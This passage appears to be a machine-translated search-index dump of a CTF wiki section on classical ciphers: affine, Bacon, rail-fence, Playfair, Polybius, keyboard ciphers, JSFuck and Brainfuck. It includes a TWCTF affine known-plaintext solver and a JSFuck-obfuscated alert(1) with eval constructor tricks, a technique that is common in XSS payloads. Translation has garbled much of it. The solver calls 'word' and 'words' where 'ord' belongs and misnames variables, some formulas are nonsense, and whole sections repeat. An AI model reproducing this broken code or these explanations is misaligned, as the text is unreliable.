E(x)=(ax+b)\\pmod m E(x)=(ax+b)\\pmod m , where x x indicates the number of plaintexts obtained by some encoding a a and m m are qualitative m m is the number of letters in the encoding system. The decryption function is D(x)=a^{-1}(xb)\\pmod m D(x)=a^{-1}(xb)\\pmod m , where a^{-1} a^{-1} is a a at \\mathbb{Z}_{m} \\mathbb{Z}_{m} Multiplication inverse. Let's take the E(x) = (5x + 8) \\bmod 26 E(x) = (5x + 8) \\bmod 26 function as an example. The encrypted string is AFFINE CIPHER . Here we use the alphabet 26 letters as the encoding system. | \u660e\u6587 | A | F | F | I | N | E | C | I | P | H | E | R | | --------- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | | x | 0 | 5 | 5 | 8 | 13 | 4 | 2 | 8 | 15 | 7 | 4 | 17 | | $ y = 5x + 8 $ | 8 | 33 | 33 | 48 | 73 | 28 | 18 | 48 | 83 | 43 | 28 | 93 | | $ y mod26 $ | 8 | 7 | 7 | 22 | 21 | 2 | 18 | 22 | 5 | 17 | 2 | 15 | | \u5bc6\u6587 | I | H | H | W | V | C | S | W | F | R | C | P | The corresponding encryption result is IHHWVCSWFRCP . For the decryption process, the normal decrypter has a and b, and can calculate a^{-1} a^{-1} to be 21, so its decryption function is D(x)=21(x-8)\\pmod {26} D(x)=21(x-8)\\pmod {26} , Decrypt as follows | \u5bc6\u6587 | I | H | H | W | V | C | S | W | F | R | C | P | | ----------- | :--- | :--- | --- | --- | --- | ---- | --- | --- | --- | --- | ---- | --- | | $ y $ | 8 | 7 | 7 | 22 | 21 | 2 | 18 | 22 | 5 | 17 | 2 | 15 | | x=21(y-8) x=21(y-8) | 0 | -21 | -21 | 294 | 273 | -126 | 210 | 294 | -63 | 189 | -126 | 147 | | x\\mod26 x\\mod26 | 0 | 5 | 5 | 8 | 13 | 4 | 2 | 8 | 15 | 7 | 4 | 17 | | \u660e\u6587 | A | F | F | I | N | E | C | I | P | H | E | R | It can be seen that it is characterized by only 26 English letters.","title":"Principle"},{"location":"crypto/classical/monoalphabetic/#_4","text":"First of all, we can see that the affine password is different for any two different letters, and the ciphertext obtained by it is different, so it also has the most common features. When the ciphertext length is long enough, we can use the frequency analysis method to solve it. Second, we can consider how to attack the password. It can be seen that when a=1 a=1 , the affine encryption is Caesar encryption. In general, when we use affine ciphers, the character set uses the alphabet, generally only 26 letters, and not more than 26 and 26 symbiotics. $$ (26) = (2) non (13) = 12 $$ Counting the offset of b, there is a total possible key space size. $$ 12 \\times 26 = 312 $$ In general, for this kind of password, we must at least attack the known part of the plaintext. A simple analysis is performed below. This kind of password is controlled by two parameters. If we know any one of them, then we can easily enumerate another parameter quickly to get the answer. However, suppose we already know the set of letters used, here we assume 26 letters, we have another way of decryption, we only need to know the two encrypted letters y_1, y_2 y_1, y_2 to decrypt. Then we can still know $$ y_1=(ax_1+b)\\pmod{26} \\ y_2=(ax_2+b)\\pmod{26} $$ Two types of subtraction, available $$ y_1-y_2=a(x_1-x_2)\\pmod{26} $$ Here y_1,y_2 y_1,y_2 is known. If we know the two different characters x_1 x_1 and x_2 x_2 for the cipher text, then we can easily get a a and then get b b .","title":"\u7834"},{"location":"crypto/classical/monoalphabetic/#examples","text":"Here we take TWCTF 2016's super_express as an example. Simply look at the source code import sys key = '****CENSORED***************' flag = 'TWCTF{*******CENSORED********}' if len ( key ) % 2 == 1 : print ( \"Key Length Error\" ) sys . exit ( 1 ) n = len ( key ) / 2 encrypted = '' for c in flag : c = word ( c ) for a , b in zip ( key [ 0 : n ], key [ n : 2 * n ]): c = ( ord ( a ) * c + ord ( b )) % 251 encrypted += ' %02x ' % c print encrypted It can be found that although each letter in the flag is encrypted n times, if we analyze it carefully, we can find $$ \\begin{align*} c_1&=a_1c+b_1 \\ c_2 & = a_2c_1 + b_2 \\ &=a_1a_2c+a_2b_1+b_2 \\ & = kc + d \\end{align*} $$ According to the second line of derivation, we can get the actual form of $c_n $, which can be seen as $c_n=xc+y $ , and we can know that the key is always unchanged, so that In fact, this is the affine password. In addition, the title also gives the plaintext and part of the partial ciphertext corresponding plaintext, then we can easily use the known plaintext attack method to attack, using the code as follows import gmpy key = '****CENSORED****************' flag = 'TWCTF{*******CENSORED********}' f = open ( 'encrypted' , 'r' ) data = f . read () . strip ( ' \\n ' ) encrypted = [ int ( data [ i : i + 2 ], 16 ) for i in range ( 0 , len ( data ), 2 )] plaindelta = words ( flag [ 1 ]) - words ( flag [ 0 ]) cipherdalte = encrypted [ 1 ] - encrypted [ 0 ] a = gmpy . invert ( plaindelta , 251 ) * cipheral % 251 b = ( encrypted [ 0 ] - a * ord ( flag [ 0 ])) % 251 a_inv = gmpy . invert ( a , 251 ) result = \"\" for c in encrypted : result += chr (( c - b ) * a_inv % 251 ) print result Results are as follows \u279c TWCTF2016-super_express git: ( master ) \u2717 python exploit.py TWCTF { Faster_Than_Shinkansen! }","title":"Examples"},{"location":"crypto/classical/others/","text":"Bacon Password \u00b6 Principle \u00b6 The Bacon password uses two different fonts, representing A and B, combined with an encryption table for encryption and decryption. a AAAAA g AABBA n ABBAA t BAABA | b AAAAB | h. | AABBB | o | ABBAB | uv | BAABB | | c | AAABA | ij | ABAAA | p | ABBBA | w | BABAA | | d | AAABB | k | ABAAB | q | ABBBB | x | BABAB | | e | AABAA | l | ABABA | r | BAAAA | y | BABBA | | f AABAB m ABABB | s BAAAB z BABBB The above is a commonly used encryption table. There is another type of encryption table that can be thought of as sorting 26 letters from 0 to 25, expressed in binary, with A representing 0 and B representing 1. The following paragraph is the encrypted content of plain text steganography, the normal font is A, and the bold is B: T o en co de a mes s age e ac h letter of the pl a i nt ex t i s replaced b y a g rou p of f i ve of th e lett ers 'A' o r 'B' . It can be seen that the Bacon password mainly has the following characteristics. only two characters the length of each segment is 5 Encrypted content will have a special font, or case. Tools \u00b6 http://rumkin.com/tools/cipher/baconian.php fence password \u00b6 Principle \u00b6 The fence password divides the plaintext to be encrypted into N groups, and then connects the first word of each group to form an irregular word. Here is an example \u660e\u6587\uff1aTHERE IS A CIPHER Changed after removing the space THEREISACIPHER Divided into two columns, two groups get TH IS EI SA CI PH ER First take the first letter and then take the second letter TEESCPE HRIAIHR Connected together TEESCPEHRIAIHR The above plain text can also be divided into 2 columns. THEREIS ACIPHER Combine to get ciphertext TAHCEIRPEHIESR Tools \u00b6 To be added. \u66f2\u8def\u5bc6\u7801 \u00b6 Principle \u00b6 Curve Cipher is a transposition password that requires the two parties to agree on the key (that is, the path of the curve). An example is given below \u660e\u6587\uff1aThe quick brown fox jumps over the lazy dog Fill in 5 rows and 7 lists (pre-agreed the number of rows and columns filled) Encrypted loop line (pre-agreed the number of rows and columns filled) \u5bc6 \u6587: gesfc inpho dtmwu qoury zejre hbxva lookT Column Shift Encryption \u00b6 Principle \u00b6 Column Transposition Cipher is a relatively simple and easy-to-implement transposition cipher that mixes plaintext into ciphertext through a simple rule. An example is given below. We use the clear text The quick brown fox jumps over the lazy dog , the key how are u as an example: Fill in the clear line with 5 rows and 7 lists (pre-agreed the number of rows and columns to be filled in. If the plain text cannot be filled in, the form can be filled with a letter) Key: how are u , press how are u to number in the order in which the alphabet appears. We have a for 1, e for 2, h for 3, o for 4, and r for 5. u is 6, and w is 7, so write a column first, followed by column e, and so on. The result is cipher text: \u5bc6 \u6587: qoury inpho takool hbxva uwmtd cfseg erjez Tools \u00b6 http://www.practicalcryptography.com/ciphers/classical-era/columnar-transposition/ The number of rows and columns is equal 01248 Password \u00b6 Principle \u00b6 This password, also known as cloud shadow password, uses 0, 1, 2, 4, 8 four digits, where 0 is used to indicate the interval, and other numbers can be expressed by addition: 28=10,124=7,18=9 Then use 1->26 to indicate A->Z. It can be seen that the password has the following characteristics only 0, 1, 2, 4, 8 Examples \u00b6 Here we take CFF 2016 shadow password as an example, the topic 8842101220480224404014224202480122 We divide by 0, as follows Content Numbers Characters | 88421 | 8 + 8 + 4 + 2 + 1 = 23 W | | 122 | 1 + 2 + 2 = 5 | E | | 48 | 4 + 8 = 12 | L | | 2244 | 2 + 2 + 4 + 4 = 12 | L | | 4 | 4 | D | | 142242 | 1 + 4 + 2 + 2 + 4 + 2 = 15 | O | | 248 | 2+4+8=14 | N | | 122 | 1 + 2 + 2 = 5 | E | So the final flag is WELLDONE. JSFuck \u00b6 Principle \u00b6 JSFuck can write JavaScript programs with only 6 characters []()!+ . For example, we want to use JSFuck to implement the alert(1) code as follows [][( ! [] + [])[ + [[ + []]]] + ([][[]] + [])[ + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ []]]] + ( ! [] + [])[ + [[ !+ [] +!+ []]]] + ( !! [] + [])[ + [[ + []]]] + ( !! [] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ +!+ []]]]][([][( ! [] + [])[ + [[ + []]]] + ([][[]] + [])[ + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ []]]] + ( ! [] + [])[ + [[ !+ [] +!+ []]]] + ( !! [] + [])[ + [[ + []]]] + ( !! [] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ +!+ []]]]] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ([][( ! [] + [])[ + [[ + []]]] + ([][[]] + [])[ + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ []]]] + ( ! [] + [])[ + [[ !+ [] +!+ []]]] + ( !! [] + [])[ + [[ + []]]] + ( !! [] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ +!+ []]]]] + [])[ + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ [] +!+ []]]] + ([][[]] + [])[ + [[ +!+ []]]] + ( ! [] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ + []]]] + ( !! [] + [])[ + [[ +!+ []]]] + ([][[]] + [])[ + [[ + []]]] + ([][( ! [] + [])[ + [[ + []]]] + ([][[]] + [])[ + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ []]]] + ( ! [] + [])[ + [[ !+ [] +!+ []]]] + ( !! [] + [])[ + [[ + []]]] + ( !! [] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ +!+ []]]]] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ + []]]] + ([][( ! [] + [])[ + [[ + []]]] + ([][[]] + [])[ + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ []]]] + ( ! [] + [])[ + [[ !+ [] +!+ []]]] + ( !! [] + [])[ + [[ + []]]] + ( !! [] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ +!+ []]]]] + [])[ + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ +!+ []]]]](( ! [] + [])[ + [[ +!+ []]]] + ( ! [] + [])[ + [[ !+ [] +!+ []]]] + ( !! [] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ +!+ []]]] + ( !! [] + [])[ + [[ + []]]] + ([][( ! [] + [])[ + [[ + []]]] + ([][[]] + [])[ + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ []]]] + ( ! [] + [])[ + [[ !+ [] +!+ []]]] + ( !! [] + [])[ + [[ + []]]] + ( !! [] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ +!+ []]]]] + [])[ + [[ +!+ []]] + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ []]]] + [ +!+ []] + ([][( ! [] + [])[ + [[ + []]]] + ([][[]] + [])[ + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ []]]] + ( ! [] + [])[ + [[ !+ [] +!+ []]]] + ( !! [] + [])[ + [[ + []]]] + ( !! [] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ +!+ []]]]] + [])[ + [[ +!+ []]] + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ [] +!+ []]]])() Some other basic expressions: false => ! [] true => !! [] undefined => [][[]] NaN =& gt ; + [ ! []] 0 => + [] 1 => +!+ [] 2 => !+ [] +!+ [] 10 => [ +!+ []] + [ + []] Array => [] Number => + [] String => [] + [] Boolean => ! [] Function => [][ \"filter\" ] eval => [][ \"filter\" ][ \"constructor\" ]( CODE )() window => [][ \"filter\" ][ \"constructor\" ]( \"return this\" )() Tools \u00b6 [JSFuck Online Encryption Website] ( http://www.jsfuck.com/ ) BrainFuck \u00b6 Principle \u00b6 Brainfuck, a minimal computer language, was created in 1993 by Urban M\u00fcller. Let's take an example if we want to print Hello World on the screen! , then the corresponding program is as follows. For the principles, you can search online for your own interest. ++++++++++[>+++++++>++++++++++>+++>+<<<<-] >++.>+.+++++++..+++.>++.<<+++++++++++++++. >.+++.------.--------.>+.>. Corresponding to it is ook. Tools \u00b6 https://www.splitbrain.org/services/ook Pigsty password \u00b6 Principle \u00b6 The pigsty password is a simple alternative password based on the grid. The grid is as follows ![Pig password comparison table] (./figure/pigpen.png) Let's take an example, such as the plain text is X marks the spot , then the ciphertext is as follows ![pig password example] (./figure/pigpen_example.png) Tools \u00b6 http://www.simonsingh.net/The_Black_Chamber/pigpen.html Dancing villain password \u00b6 Principle \u00b6 This password comes from the Sherlock Holmes collection. Each dancing villain actually corresponds to one of the twenty-six letters in English, while the flag in the hand of the villain indicates that the letter is the last letter of the word, if it is just a word instead of a sentence, or a sentence The last word in the word, the last letter in the word does not have to be raised. ![Dancing Man's Password] (./figure/dancingman.jpg) Keyboard password \u00b6 The so-called keyboard password is encrypted using a mobile phone keyboard or a computer keyboard. Mobile keyboard password \u00b6 The phone keyboard encryption method is that there are 3-4 letters on each number key, and the two-digit number is used to represent the letter. For example: ru is represented by the phone keypad: 7382, then you can know here, the phone keyboard encryption method is impossible. Start with 1, the second digit cannot exceed 4, refer to this when decrypting Another way to encrypt your phone's keyboard is the \"sound\" style (this may vary depending on the phone). Refer to the phone keypad for details. For example, \"Number\" means: 748 94. Pressing these numbers on the phone keypad will bring out the pinyin of \"number\". Computer keyboard board \u00b6 The computer keyboard is encrypted and uses the square of the computer's board. Computer keyboard coordinates \u00b6 Encryption of the computer keyboard coordinates, using the letter lines and numbers on the keyboard to encrypt, for example: bye using the computer keyboard XY means: 351613 ![Computer keyboard coordinate encryption] (./figure/computer-xy.jpg) Computer keyboard QWE \u00b6 Computer keyboard QWE encryption method is to replace the order of the keyboard with the alphabet. Keyboard layout encryption \u00b6 Simply put, it is encrypted according to how the given character looks on the keyboard. 0CTF 2014 classic \u00b6 > Xiaoding Ding found himself in a strange room with only a door with strange characters in front of him. He found a password lock on the side of the door, which seemed to require a password to open the door. . 4esxcft5 rdcvgt 6tfc78uhg 098ukmnb Found so chaotic, but also including the number and letter guess may be the keyboard password, try to draw in the alphabetical order on the keyboard, you can get 0ops, guess is the flag. 2017 xman trials - one two three, wood people \u00b6 > I count 123 wood people, and I will be deducted if I don't act. 23731263111628163518122316391715262121 > password format xman{flag} There are obvious hints 123 in the title, then it is natural to think of the computer keyboard coordinate password in the keyboard password. You can find that the second digits of the first few digits are in the range of 1-3, which also verifies our guess. then 23-x 73-m 12-a 63-n 11-q No, the password format is xman{ , the fourth character is { , so I look at the position of { , which does not have a corresponding abscissa, but if we manually treat it as 11, then 111 is { . Then push back in turn and find that it is feasible. Finally, treat 121 as } to get the flag. xman{hintisenough} From here we can see that we still have to pay attention to mobility, and we cannot simply copy some existing knowledge. Title \u00b6 Experiment with strange text messages","title":"Other Types of Cipher"},{"location":"crypto/classical/others/#bacon-password","text":"","title":"Bacon Password"},{"location":"crypto/classical/others/#principle","text":"The Bacon password uses two different fonts, representing A and B, combined with an encryption table for encryption and decryption. a AAAAA g AABBA n ABBAA t BAABA | b AAAAB | h. | AABBB | o | ABBAB | uv | BAABB | | c | AAABA | ij | ABAAA | p | ABBBA | w | BABAA | | d | AAABB | k | ABAAB | q | ABBBB | x | BABAB | | e | AABAA | l | ABABA | r | BAAAA | y | BABBA | | f AABAB m ABABB | s BAAAB z BABBB The above is a commonly used encryption table. There is another type of encryption table that can be thought of as sorting 26 letters from 0 to 25, expressed in binary, with A representing 0 and B representing 1. The following paragraph is the encrypted content of plain text steganography, the normal font is A, and the bold is B: T o en co de a mes s age e ac h letter of the pl a i nt ex t i s replaced b y a g rou p of f i ve of th e lett ers 'A' o r 'B' . It can be seen that the Bacon password mainly has the following characteristics. only two characters the length of each segment is 5 Encrypted content will have a special font, or case.","title":"Principle"},{"location":"crypto/classical/others/#tools","text":"http://rumkin.com/tools/cipher/baconian.php","title":"Tools"},{"location":"crypto/classical/others/#fence-password","text":"","title":"fence password"},{"location":"crypto/classical/others/#principle_1","text":"The fence password divides the plaintext to be encrypted into N groups, and then connects the first word of each group to form an irregular word. Here is an example \u660e\u6587\uff1aTHERE IS A CIPHER Changed after removing the space THEREISACIPHER Divided into two columns, two groups get TH IS EI SA CI PH ER First take the first letter and then take the second letter TEESCPE HRIAIHR Connected together TEESCPEHRIAIHR The above plain text can also be divided into 2 columns. THEREIS ACIPHER Combine to get ciphertext TAHCEIRPEHIESR","title":"Principle"},{"location":"crypto/classical/others/#tools_1","text":"To be added.","title":"Tools"},{"location":"crypto/classical/others/#_1","text":"","title":"\u66f2\u8def\u5bc6\u7801"},{"location":"crypto/classical/others/#principle_2","text":"Curve Cipher is a transposition password that requires the two parties to agree on the key (that is, the path of the curve). An example is given below \u660e\u6587\uff1aThe quick brown fox jumps over the lazy dog Fill in 5 rows and 7 lists (pre-agreed the number of rows and columns filled) Encrypted loop line (pre-agreed the number of rows and columns filled) \u5bc6 \u6587: gesfc inpho dtmwu qoury zejre hbxva lookT","title":"Principle"},{"location":"crypto/classical/others/#column-shift-encryption","text":"","title":"Column Shift Encryption"},{"location":"crypto/classical/others/#principle_3","text":"Column Transposition Cipher is a relatively simple and easy-to-implement transposition cipher that mixes plaintext into ciphertext through a simple rule. An example is given below. We use the clear text The quick brown fox jumps over the lazy dog , the key how are u as an example: Fill in the clear line with 5 rows and 7 lists (pre-agreed the number of rows and columns to be filled in. If the plain text cannot be filled in, the form can be filled with a letter) Key: how are u , press how are u to number in the order in which the alphabet appears. We have a for 1, e for 2, h for 3, o for 4, and r for 5. u is 6, and w is 7, so write a column first, followed by column e, and so on. The result is cipher text: \u5bc6 \u6587: qoury inpho takool hbxva uwmtd cfseg erjez","title":"Principle"},{"location":"crypto/classical/others/#tools_2","text":"http://www.practicalcryptography.com/ciphers/classical-era/columnar-transposition/ The number of rows and columns is equal","title":"Tools"},{"location":"crypto/classical/others/#01248-password","text":"","title":"01248 Password"},{"location":"crypto/classical/others/#principle_4","text":"This password, also known as cloud shadow password, uses 0, 1, 2, 4, 8 four digits, where 0 is used to indicate the interval, and other numbers can be expressed by addition: 28=10,124=7,18=9 Then use 1->26 to indicate A->Z. It can be seen that the password has the following characteristics only 0, 1, 2, 4, 8","title":"Principle"},{"location":"crypto/classical/others/#examples","text":"Here we take CFF 2016 shadow password as an example, the topic 8842101220480224404014224202480122 We divide by 0, as follows Content Numbers Characters | 88421 | 8 + 8 + 4 + 2 + 1 = 23 W | | 122 | 1 + 2 + 2 = 5 | E | | 48 | 4 + 8 = 12 | L | | 2244 | 2 + 2 + 4 + 4 = 12 | L | | 4 | 4 | D | | 142242 | 1 + 4 + 2 + 2 + 4 + 2 = 15 | O | | 248 | 2+4+8=14 | N | | 122 | 1 + 2 + 2 = 5 | E | So the final flag is WELLDONE.","title":"Examples"},{"location":"crypto/classical/others/#jsfuck","text":"","title":"JSFuck"},{"location":"crypto/classical/others/#principle_5","text":"JSFuck can write JavaScript programs with only 6 characters []()!+ . For example, we want to use JSFuck to implement the alert(1) code as follows [][( ! [] + [])[ + [[ + []]]] + ([][[]] + [])[ + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ []]]] + ( ! [] + [])[ + [[ !+ [] +!+ []]]] + ( !! [] + [])[ + [[ + []]]] + ( !! [] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ +!+ []]]]][([][( ! [] + [])[ + [[ + []]]] + ([][[]] + [])[ + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ []]]] + ( ! [] + [])[ + [[ !+ [] +!+ []]]] + ( !! [] + [])[ + [[ + []]]] + ( !! [] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ +!+ []]]]] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ([][( ! [] + [])[ + [[ + []]]] + ([][[]] + [])[ + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ []]]] + ( ! [] + [])[ + [[ !+ [] +!+ []]]] + ( !! [] + [])[ + [[ + []]]] + ( !! [] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ +!+ []]]]] + [])[ + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ [] +!+ []]]] + ([][[]] + [])[ + [[ +!+ []]]] + ( ! [] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ + []]]] + ( !! [] + [])[ + [[ +!+ []]]] + ([][[]] + [])[ + [[ + []]]] + ([][( ! [] + [])[ + [[ + []]]] + ([][[]] + [])[ + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ []]]] + ( ! [] + [])[ + [[ !+ [] +!+ []]]] + ( !! [] + [])[ + [[ + []]]] + ( !! [] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ +!+ []]]]] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ + []]]] + ([][( ! [] + [])[ + [[ + []]]] + ([][[]] + [])[ + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ []]]] + ( ! [] + [])[ + [[ !+ [] +!+ []]]] + ( !! [] + [])[ + [[ + []]]] + ( !! [] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ +!+ []]]]] + [])[ + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ +!+ []]]]](( ! [] + [])[ + [[ +!+ []]]] + ( ! [] + [])[ + [[ !+ [] +!+ []]]] + ( !! [] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ +!+ []]]] + ( !! [] + [])[ + [[ + []]]] + ([][( ! [] + [])[ + [[ + []]]] + ([][[]] + [])[ + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ []]]] + ( ! [] + [])[ + [[ !+ [] +!+ []]]] + ( !! [] + [])[ + [[ + []]]] + ( !! [] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ +!+ []]]]] + [])[ + [[ +!+ []]] + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ []]]] + [ +!+ []] + ([][( ! [] + [])[ + [[ + []]]] + ([][[]] + [])[ + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ []]]] + ( ! [] + [])[ + [[ !+ [] +!+ []]]] + ( !! [] + [])[ + [[ + []]]] + ( !! [] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ +!+ []]]]] + [])[ + [[ +!+ []]] + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ [] +!+ []]]])() Some other basic expressions: false => ! [] true => !! [] undefined => [][[]] NaN =& gt ; + [ ! []] 0 => + [] 1 => +!+ [] 2 => !+ [] +!+ [] 10 => [ +!+ []] + [ + []] Array => [] Number => + [] String => [] + [] Boolean => ! [] Function => [][ \"filter\" ] eval => [][ \"filter\" ][ \"constructor\" ]( CODE )() window => [][ \"filter\" ][ \"constructor\" ]( \"return this\" )()","title":"Principle"},{"location":"crypto/classical/others/#tools_3","text":"[JSFuck Online Encryption Website] ( http://www.jsfuck.com/ )","title":"Tools"},{"location":"crypto/classical/others/#brainfuck","text":"","title":"BrainFuck"},{"location":"crypto/classical/others/#principle_6","text":"Brainfuck, a minimal computer language, was created in 1993 by Urban M\u00fcller. Let's take an example if we want to print Hello World on the screen! , then the corresponding program is as follows. For the principles, you can search online for your own interest. ++++++++++[>+++++++>++++++++++>+++>+<<<<-] >++.>+.+++++++..+++.>++.<<+++++++++++++++. >.+++.------.--------.>+.>. Corresponding to it is ook.","title":"Principle"},{"location":"crypto/classical/others/#tools_4","text":"https://www.splitbrain.org/services/ook","title":"Tools"},{"location":"crypto/classical/others/#pigsty-password","text":"","title":"Pigsty password"},{"location":"crypto/classical/others/#principle_7","text":"The pigsty password is a simple alternative password based on the grid. The grid is as follows ![Pig password comparison table] (./figure/pigpen.png) Let's take an example, such as the plain text is X marks the spot , then the ciphertext is as follows ![pig password example] (./figure/pigpen_example.png)","title":"Principle"},{"location":"crypto/classical/others/#tools_5","text":"http://www.simonsingh.net/The_Black_Chamber/pigpen.html","title":"Tools"},{"location":"crypto/classical/others/#dancing-villain-password","text":"","title":"Dancing villain password"},{"location":"crypto/classical/others/#principle_8","text":"This password comes from the Sherlock Holmes collection. Each dancing villain actually corresponds to one of the twenty-six letters in English, while the flag in the hand of the villain indicates that the letter is the last letter of the word, if it is just a word instead of a sentence, or a sentence The last word in the word, the last letter in the word does not have to be raised. ![Dancing Man's Password] (./figure/dancingman.jpg)","title":"Principle"},{"location":"crypto/classical/others/#keyboard-password","text":"The so-called keyboard password is encrypted using a mobile phone keyboard or a computer keyboard.","title":"Keyboard password"},{"location":"crypto/classical/others/#mobile-keyboard-password","text":"The phone keyboard encryption method is that there are 3-4 letters on each number key, and the two-digit number is used to represent the letter. For example: ru is represented by the phone keypad: 7382, then you can know here, the phone keyboard encryption method is impossible. Start with 1, the second digit cannot exceed 4, refer to this when decrypting Another way to encrypt your phone's keyboard is the \"sound\" style (this may vary depending on the phone). Refer to the phone keypad for details. For example, \"Number\" means: 748 94. Pressing these numbers on the phone keypad will bring out the pinyin of \"number\".","title":"Mobile keyboard password"},{"location":"crypto/classical/others/#computer-keyboard-board","text":"The computer keyboard is encrypted and uses the square of the computer's board.","title":"Computer keyboard board"},{"location":"crypto/classical/others/#computer-keyboard-coordinates","text":"Encryption of the computer keyboard coordinates, using the letter lines and numbers on the keyboard to encrypt, for example: bye using the computer keyboard XY means: 351613 ![Computer keyboard coordinate encryption] (./figure/computer-xy.jpg)","title":"Computer keyboard coordinates"},{"location":"crypto/classical/others/#computer-keyboard-qwe","text":"Computer keyboard QWE encryption method is to replace the order of the keyboard with the alphabet.","title":"Computer keyboard QWE"},{"location":"crypto/classical/others/#keyboard-layout-encryption","text":"Simply put, it is encrypted according to how the given character looks on the keyboard.","title":"Keyboard layout encryption"},{"location":"crypto/classical/others/#0ctf-2014-classic","text":"> Xiaoding Ding found himself in a strange room with only a door with strange characters in front of him. He found a password lock on the side of the door, which seemed to require a password to open the door. . 4esxcft5 rdcvgt 6tfc78uhg 098ukmnb Found so chaotic, but also including the number and letter guess may be the keyboard password, try to draw in the alphabetical order on the keyboard, you can get 0ops, guess is the flag.","title":"0CTF 2014 classic"},{"location":"crypto/classical/others/#2017-xman-trials-one-two-three-wood-people","text":"> I count 123 wood people, and I will be deducted if I don't act. 23731263111628163518122316391715262121 > password format xman{flag} There are obvious hints 123 in the title, then it is natural to think of the computer keyboard coordinate password in the keyboard password. You can find that the second digits of the first few digits are in the range of 1-3, which also verifies our guess. then 23-x 73-m 12-a 63-n 11-q No, the password format is xman{ , the fourth character is { , so I look at the position of { , which does not have a corresponding abscissa, but if we manually treat it as 11, then 111 is { . Then push back in turn and find that it is feasible. Finally, treat 121 as } to get the flag. xman{hintisenough} From here we can see that we still have to pay attention to mobility, and we cannot simply copy some existing knowledge.","title":"2017 xman trials - one two three, wood people"},{"location":"crypto/classical/others/#title","text":"Experiment with strange text messages","title":"Title"},{"location":"crypto/classical/polyalphabetic/","text":"For multi-table replacement encryption, the encrypted letters almost no longer maintain the original frequency, so we can only use the algorithm to achieve the corresponding weakness to crack. Playfair \u00b6 Principle \u00b6 The Playfair cipher or Playfair square is a replacement password, invented by the British Charles Wheatstone in 1854. The basic algorithm is as follows: Select a string of English letters, remove the repeated letters, and add the remaining letters one by one to the 5 \u00d7 5 matrix. The remaining space is added by the unjoined English letters in the order of az. Note that q is removed, or i and j are treated as the same word. Divide the plaintext to be encrypted into two groups. If the letters in the group are the same, add X (or Q) to the first letter of the group and regroup. If there is one word left, also add X. In each group, find out where the two letters are in the matrix. If the two letters have different rows and different columns, find the other two letters in the matrix (the first letter corresponds to the row first), so that the four letters become the four corners of a rectangle. If the two letters are accompanied, take the letters to the right of the two letters (if the letter is at the far right, take the leftmost letter). If the two letters are in the same column, take the letters below the two letters (if the letter is at the bottom, take the top letter). The two newly found letters are the result of the original two-letter encryption. Use playfair example as the key, get P L A Y F iREX B C D G H K N O Q S T U V W Z The message to be encrypted is Hide the gold in the tree stump THAT IS TH EG OL DI NT HE TR EX IS YOUR MP Will get BM OD ZB XD WILL BE DM UI XM FOR UV IF Tools \u00b6 CAP4 , Polybius \u00b6 Principle \u00b6 Polybius passwords are also known as board passwords, which are generally used to encrypt a given plaintext into a pair of numbers. | | 1 | 2 | 3 | 4 | 5 | | :--- | --- | --- | --- | --- | :--- | | 1 | A | B | C | D | E | | 2 | F | G | H | I/J | K | | 3 | L | M | N | O | P | | 4 | Q | R | S | T | U | | 5 V W | X Y | Z | For example, plain text HELLO, encrypted is 23 15 31 31 34. Another password table | | A | D | F | G | X | | --- | --- | --- | --- | --- | --- | | A | b | t | a | l | p | | D | d | h | o | z | k | | F | q | f | v | s | n | | G | g | j | c | u | x | | X | m | r | e | w | y | Note that the order of the letters here is upset. The origin of ADFGX: > In 1918, when the First World War was about to end, the French army 